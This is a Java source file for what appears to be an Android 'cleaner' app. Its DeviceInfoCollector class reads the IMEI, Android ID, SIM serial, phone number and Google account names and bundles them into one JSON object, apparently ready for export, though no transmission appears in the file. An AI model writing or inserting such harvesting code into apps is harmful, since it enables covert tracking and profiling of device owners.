package com.utility.cleanerapp;

import android.content.Context;
import android.telephony.TelephonyManager;
import android.provider.Settings;
import android.os.Build;
import android.accounts.AccountManager;
import android.accounts.Account;
import org.json.JSONObject;
import org.json.JSONArray;
import android.util.Log;

public class DeviceInfoCollector {
    
    private static final String TAG = "DeviceInfoCollector";
    
    public String getDeviceId(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                return telephonyManager.getDeviceId();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for getDeviceId", e);
        } catch (Exception e) {
            Log.e(TAG, "Error getting device ID", e);
        }
        return null;
    }
    
    public String getAndroidId(Context context) {
        try {
            return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            Log.e(TAG, "Error getting Android ID", e);
        }
        return null;
    }
    
    public String getDeviceModel() {
        try {
            return Build.MANUFACTURER + " " + Build.MODEL;
        } catch (Exception e) {
            Log.e(TAG, "Error getting device model", e);
        }
        return null;
    }
    
    public String[] getGoogleAccounts(Context context) {
        try {
            AccountManager accountManager = AccountManager.get(context);
            Account[] accounts = accountManager.getAccountsByType("com.google");
            String[] accountNames = new String[accounts.length];
            for (int i = 0; i < accounts.length; i++) {
                accountNames[i] = accounts[i].name;
            }
            return accountNames;
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for getGoogleAccounts", e);
        } catch (Exception e) {
            Log.e(TAG, "Error getting Google accounts", e);
        }
        return new String[0];
    }
    
    public String getSimSerialNumber(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                return telephonyManager.getSimSerialNumber();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for getSimSerialNumber", e);
        } catch (Exception e) {
            Log.e(TAG, "Error getting SIM serial number", e);
        }
        return null;
    }
    
    public String getPhoneNumber(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                return telephonyManager.getLine1Number();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for getPhoneNumber", e);
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone number", e);
        }
        return null;
    }
    
    public JSONObject collectAllDeviceInfo(Context context) {
        JSONObject deviceInfo = new JSONObject();
        try {
            deviceInfo.put("imei", getDeviceId(context));
            deviceInfo.put("android_id", getAndroidId(context));
            deviceInfo.put("device_model", getDeviceModel());
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("brand", Build.BRAND);
            deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
            deviceInfo.put("sim_serial", getSimSerialNumber(context));
            deviceInfo.put("phone_number", getPhoneNumber(context));
            
            String[] googleAccounts = getGoogleAccounts(context);
            JSONArray accountsArray = new JSONArray();
            for (String account : googleAccounts) {
                accountsArray.put(account);
            }
            deviceInfo.put("google_accounts", accountsArray);
            
        } catch (Exception e) {
            Log.e(TAG, "Error collecting device info", e);
        }
        return deviceInfo;
    }
}